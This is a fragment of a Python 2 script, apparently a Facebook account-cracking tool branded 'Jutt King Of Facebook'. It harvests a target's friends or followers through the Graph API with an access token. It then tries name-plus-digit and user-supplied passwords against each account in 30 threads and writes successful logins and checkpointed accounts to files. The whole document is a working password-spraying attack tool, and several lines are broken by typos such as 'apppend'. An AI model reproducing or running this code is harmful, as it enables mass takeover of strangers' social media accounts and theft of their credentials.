                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass6
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mProccess Complete'
    print '\033[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\033[1;97m Press enter to back')
    choice_crack()

def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[0] Back'
    a_s()


def name_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93m~~~~ Name + Number pass cracking ~~~~\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public id cloning'
    print '\x1b[1;92m[2] Followers cloning'
    print '\x1b[1;92m[3] File cloning'
    print '\x1b[1;92m[B] Back'
    n_s()


def n_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80jutt\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Name + Number pass public cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93m~~~~Name pass public cracking~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            name_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print ' \x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        idt = raw_input(' \x1b[1;93m[\xe2\x98\x85]Enter id: ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93m~~~~ Name pass followers cracking ~~~~'
            print ' \x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;93m~~~~ Name + Number pass File cracking ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93mFor example:123,1234,12345,786,12,1122\x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1]Name + digit: ')
        p2 = raw_input(' \x1b[1;92m[2]Name + digit: ')
        p3 = raw_input(' \x1b[1;92m[3]Name + digit: ')
        p4 = raw_input(' \x1b[1;92m[4]Name + digit: ')
        pass5 = raw_input(' \x1b[1;92m[5]Password: ')
        pass6 = raw_input(' \x1b[1;92m[6]Password: ')
        pass7 = raw_input(' \x1b[1;92m[7]Password: ')
        pass8 = raw_input(' \x1b[1;92m[8]Password: ')
        try:
            idlist = raw_input('[+] File Name: ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print ' Total ids: ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;97mCrack Running\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mJutt King Of Facebook\x1b[1;91m'
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + p1
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass1
                cp = open('JUTT_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass2
                    cp = open('JUTT_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass3
                        cp = open('JUTT_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass4
                            cp = open('JUTT_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass5
                                cp = open('JUTT_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass6
                                    cp = open('JUTT_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass7
                                        cp = open('JUTT_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[JUTT-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/JUTT_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[JUTT-CP] ' + uid + ' | ' + pass8
                                            cp = open('JUTT_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mCrack Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    auto_crack()


if __name__ == '__main__':
    reg() 



